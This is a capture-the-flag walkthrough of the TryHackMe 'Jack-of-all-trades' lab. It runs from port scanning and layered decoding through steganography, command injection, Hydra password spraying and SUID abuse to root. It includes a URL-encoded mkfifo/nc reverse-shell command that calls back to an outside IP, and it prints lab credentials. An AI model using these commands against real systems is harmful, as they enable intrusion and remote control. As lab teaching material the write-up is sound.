# TryHackMe - Jack-of-all-trades

**Machine Name:** Jack-of-all-trades  
**Difficulty:** Medium  
**Category:** Steganography / Encoding / RCE / SUID Exploitation  
**IP Address:** 10.81.180.163  

## Description
This challenge involves a multi-layered hunt through non-standard port configurations, complex encoding "onions," and steganographic decoys. The objective is to exploit a command injection vulnerability within a hidden PHP recovery portal, escalate privileges to a local user via credential spraying, and finally abuse an incorrectly configured SUID binary to achieve root-level file access.

---

## Enumeration

### Port Scanning
I started with an nmap scan to enumerate open services:
`nmap -p- -sV -sC -Pn --min-rate 1000 10.81.180.163`

**Findings:**
* **Port 22 (HTTP):** Open. Running Apache/2.4.10. (Non-standard port for Web).
* **Port 80 (SSH):** Open. Running OpenSSH 6.7p1. (Non-standard port for SSH).

### Web Discovery
Browsing to http://10.81.180.163:22 revealed a personal site for "Jack." Inspecting the page source code uncovered two critical clues:
1.  **Hidden Page:** A comment pointing to /recovery.php.
2.  **Encoded Note:** A Base64 string: UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==

**Decoding the Base64 string:**
`echo "UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==" | base64 -d`
> Output: "...Also gotta remember your password: u?WtKSraq"

---

## The Encoding Onion
On the /recovery.php page, another large encoded string was found in the HTML comments. Following the hint regarding "Johny Graves" and his "amazing encoding systems," I decoded the string through three layers:

1.  **Base32:** Decoding the block revealed a Hexadecimal string.
2.  **Hexadecimal:** Converting the Hex string to ASCII revealed a ROT13 string.
3.  **ROT13:** Applying a 13-character shift to the string revealed the final hint:
    > "Remember that the credentials to the recovery login are hidden on the homepage! Hint: bit.ly/2TvYQ2S"

---

## Steganography (Creds Extraction)
The Bitly link confirmed the use of steganography. Using the password "u?WtKSraq", I analyzed the homepage assets:
* **header.jpg:** Success.

**Command:**
`steghide extract -sf header.jpg -p "u?WtKSraq"`

**Extracted cms.creds:**
* **Username:** jackinthebox
* **Password:** TplFxiSHjY

---

## Exploitation: Remote Code Execution (RCE)

### Accessing the Secret Portal
I submitted the credentials to /recovery.php via a POST request. The server set a login cookie and redirected to a secret management directory:
`curl -i -X POST "http://10.81.180.163:22/recovery.php" -d "user=jackinthebox&pass=TplFxiSHjY"`
* **Redirects to:** /nnxhweOV/index.php

### Command Injection
The secret index.php page contained a command execution vulnerability via the 'cmd' GET parameter. I confirmed RCE by identifying the current user:
`curl -s -b "login=jackinthebox%3Aa78e6e9d6f7b9d0abe0ea866792b7d84" "http://10.81.180.163:22/nnxhweOV/index.php?cmd=whoami"`
* **Output:** www-data

### Establishing a Reverse Shell
`curl -s -b "login=jackinthebox%3Aa78e6e9d6f7b9d0abe0ea866792b7d84" "http://10.81.180.163:22/nnxhweOV/index.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.214.156%204444%20%3E%2Ftmp%2Ff"`

---

## Privilege Escalation

### Lateral Movement (User: jack)
Inside the /home directory, I discovered "jacks_password_list". I used Hydra to perform credential spraying on the SSH service (Port 80):
`hydra -l jack -P jacks_password_list ssh://10.81.180.163:80`

* **Valid Password:** ITMJpGGIqg1jn?>@
* **User Flag (Inside user.jpg):** (User Flag)....._{........}

### Root Flag Retrieval
I searched for SUID binaries to find a path to root:
`find / -perm -u=s -type f 2>/dev/null`

The utility /usr/bin/strings was found to have the SUID bit set. I used it to read the protected root flag:
`strings /root/root.txt`

**Final Findings:**
The root file revealed a "To-Do" list including the final flag and references to criminal activities involving an accomplice named "Bill."

---

## Conclusion
This machine highlights the importance of service obfuscation awareness and the dangers of SUID misconfigurations. By correctly identifying non-standard ports, peeling back multiple layers of encoding, and identifying steganographic payloads, I was able to transition from an unauthenticated web user to full root-level file access.
